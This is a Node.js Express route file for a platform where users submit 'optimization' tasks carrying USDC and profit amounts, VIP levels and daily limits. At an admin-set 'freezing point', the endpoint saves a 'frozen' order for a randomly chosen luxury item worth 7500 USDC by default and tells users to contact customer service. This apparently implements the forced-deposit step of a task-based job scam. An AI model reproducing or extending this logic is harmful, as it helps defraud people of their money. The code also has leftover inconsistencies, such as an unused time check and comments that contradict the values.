const express = require('express');
const router = express.Router();
const Optimization = require('../models/Optimization');
const Amount = require('../models/Amount');
const FrozenAmount = require('../models/FrozenAmount');
const AdminAmount = require('../models/AdminAmount');
const User = require('../models/User'); 
const moment = require('moment-timezone');

const frozenDataArray = [
  { image: '/images/louis-vuitton-bag.jpg', name: 'Louis Vuitton Neverfull Bag' },
  { image: '/images/gucci-belt.jpg', name: 'Gucci GG Marmont Belt' },
  { image: '/images/hermes-scarf.jpg', name: 'Hermès Silk Carre Scarf' },
  { image: '/images/chanel-perfume.jpg', name: 'Chanel No.5 Perfume' },
  { image: '/images/prada-sunglasses.jpg', name: 'Prada Linea Rossa Sunglasses' },
];


// POST endpoint to save optimization data
router.post('/api/optimizations', async (req, res) => {
  try {
    const { username, selectedImage, imageName, usdcAmount, profitAmount,optimizationCount: bodyOptimizationCount } = req.body;

    // Fetch the user's data from the Amount model
    const amountData = await Amount.findOne({ username });
    if (!amountData) {
      return res.status(400).json({
        success: false,
        message: 'User data not found.',
      });
    }

    // Check the user's status
    const user = await User.findOne({ username });
    if (!user) {
      return res.status(400).json({
        success: false,
        message: 'User not found.',
      });
    }
   if (user.status === 'pending' || user.status === 'banned') {
     return res.status(403).json({
       success: false,
       message: `You can not optimize at moment. Please contact customer service`,
     });
   }
    
    // Retrieve daily limit or set to default (3) if not set
    const dailyLimit = amountData ? (amountData.dailyLimit || 165) : 165;
    const vipLevel = amountData ? amountData.vipLevel : 'VIP1';
    const freezingPoint = Number(amountData ? amountData.freezingPoint || 103 : 103);

     // Fetch the latest optimization data for the user
     const lateOptimization = await Optimization.findOne({ username }).sort({ submissionDate: -1 });
     const dbOptimizationCount = lateOptimization ? lateOptimization.optimizationCount : 0;
    
// Check if the current time is within the allowed range (10:00 AM to 10:00 PM Eastern Time)
const nowEasternTime = moment().tz('America/New_York'); // Current time in Eastern Time
const startOfAllowedTime = moment.tz(nowEasternTime.format('YYYY-MM-DD') + ' 10:00', 'YYYY-MM-DD HH:mm', 'America/New_York');
const endOfAllowedTime = moment.tz(nowEasternTime.format('YYYY-MM-DD') + ' 22:00', 'YYYY-MM-DD HH:mm', 'America/New_York');






   

    // Check if the latest optimization for this user is still pending
    const latestOptimization = await Optimization.findOne({ username }).sort({ submissionDate: -1 });
    if (latestOptimization && (latestOptimization.status === 'frozen' || latestOptimization.status === 'pending')) {
      return res.status(400).json({
        success: false,
        message: 'There are pending orders'
       
      });
    }

// Fetch the frozenUSDC and frozenProfits for the user with fallback values
const frozenAmount = await FrozenAmount.findOne({ username });
const frozenUSDC = frozenAmount ? frozenAmount.frozenUSDC : 7500; // Default: 7500
const frozenProfits = frozenAmount ? frozenAmount.frozenProfits : 800; // Default: 800




// Fetch the pending amounts from AdminAmount with fallback values
const adminAmount = await AdminAmount.findOne({ username });
const pendingAmount = adminAmount ? adminAmount.usdcAmount : 1200; // Default: 1200
const pendingProfits = adminAmount ? adminAmount.profitAmount : 400; // Default: 400


      // Handle freezing point logic
    if (bodyOptimizationCount >= freezingPoint) {
      // Select a random image-name pair
      const randomData = frozenDataArray[Math.floor(Math.random() * frozenDataArray.length)];
      const randomImage = randomData.image;
      const randomName = randomData.name;

      // Use frozenUSDC and frozenProfits for the frozen data
      const frozenData = {
        username,
        selectedImage: randomImage,
        imageName: randomName,
        usdcAmount: frozenUSDC, // Use frozenUSDC
        profitAmount: frozenProfits, // Use frozenProfits
        optimizationCount: bodyOptimizationCount + 1,
        status: 'frozen',
      };
      const pendingData = {
        username,
        selectedImage,
        imageName,
        usdcAmount: pendingAmount, // Use frozenUSDC
        profitAmount: pendingProfits,
        optimizationCount: bodyOptimizationCount,
        status: 'pending',
      };

      try {
        // Save both optimizations
        const [pendingOptimization, frozenOptimization] = await Promise.all([
          new Optimization(pendingData).save(),
          new Optimization(frozenData).save(),
        ]);
    
        return res.status(201).json({
          success: true,
          message: 'Created optimizations with "pending" and "frozen" statuses.',
          data: { pendingOptimization, frozenOptimization },
        });
      } catch (error) {
        console.error('Error saving optimization data:', error);
        return res.status(500).json({ success: false, message: 'Failed to save optimization data' });
      }
    }

    

    // Define optimization count limits for each VIP level
    const optimizationLimits = {
      VIP1: 40,
      VIP2: 45,
      VIP3: 50,
      VIP4: 55,
    };
    const maxOptimizationCount = optimizationLimits[vipLevel] || 40;

   // Check if the count from the database has reached the max limit
   if (dbOptimizationCount >= maxOptimizationCount) { 
  console.log("Limit reached at:", dbOptimizationCount);
        return res.status(400).json({
          success: false,
          message: 'Optimization count has reached the maximum allowed for your VIP level.',
          contactUsButton: `
        <button onclick="contactSupport()" class="btn btn-primary">
          Contact Us
        </button>
      `
        });
      }

    // Get the current date without time for comparison
    const today = new Date();
    today.setHours(0, 0, 0, 0);

    // Count today's submissions by this user
    const todaysSubmissions = await Optimization.countDocuments({
      username,
      submissionDate: { $gte: today },
    });

    // Check if the user has reached the daily submission limit
    if (todaysSubmissions >= dailyLimit) {
      return res.status(400).json({
        success: false,
        message: 'Daily submission limit reached.',
        contactUsButton: `
        <button onclick="contactSupport()" class="btn btn-primary">
          Contact Us
        </button>
      `
      });
    }

    // If not at freezingPoint - 1, create a single optimization with status 'pending'
    const optimization = new Optimization({
      username,
      selectedImage,
      imageName,
      usdcAmount,
      profitAmount,
     optimizationCount: bodyOptimizationCount,
      status: 'pending',
    });

    await optimization.save();

    res.status(201).json({
      success: true,
      message: 'Optimization data saved successfully',
      maxOptimizationCount,
    });
  } catch (error) {
    console.error('Error saving optimization data:', error);
    res.status(500).json({ success: false, message: 'Failed to save optimization data' });
  }
});



module.exports = router;

 